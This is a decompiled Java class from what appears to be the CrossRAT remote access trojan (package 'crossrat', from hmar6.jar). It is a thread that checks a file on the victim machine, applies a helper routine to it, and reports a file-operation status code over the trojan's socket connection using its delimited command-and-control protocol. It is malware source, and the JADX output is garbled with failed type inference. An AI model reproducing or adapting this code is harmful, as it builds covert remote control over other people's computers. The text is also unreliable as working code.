package crossrat;

import java.io.DataOutputStream;
import java.io.File;

/* loaded from: hmar6.jar:crossrat/b.class */
final class b extends Thread {

    /* renamed from: a */
    private String f30a;

    /* renamed from: b */
    private boolean f31b;
    private String c;

    public b(String str, String str2) {
        this.f30a = str;
        this.c = str2;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v14, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v16 */
    /* JADX WARN: Type inference failed for: r0v17 */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v6 */
    /* JADX WARN: Type inference failed for: r0v7, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.io.DataOutputStream] */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        String str;
        ?? r0;
        File file = new File(this.f30a);
        ?? r02 = 0;
        boolean z = false;
        try {
            r02 = new DataOutputStream(k.k.getOutputStream());
            z = r02;
        } catch (Exception e) {
            r02.printStackTrace();
        }
        if (file.exists()) {
            this.f31b = org.a.a.a.b.a(file);
            if (this.f31b) {
                String str2 = "1";
                str = str2;
                r0 = str2;
            } else {
                String str3 = "0";
                str = str3;
                r0 = str3;
            }
        } else {
            String str4 = "2";
            str = str4;
            r0 = str4;
        }
        try {
            r0 = z;
            r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.file_written_status + k.arg_delimit + str + k.arg_delimit + this.c + k.arg_delimit + "&&&");
        } catch (Exception e2) {
            r0.printStackTrace();
        }
    }
}
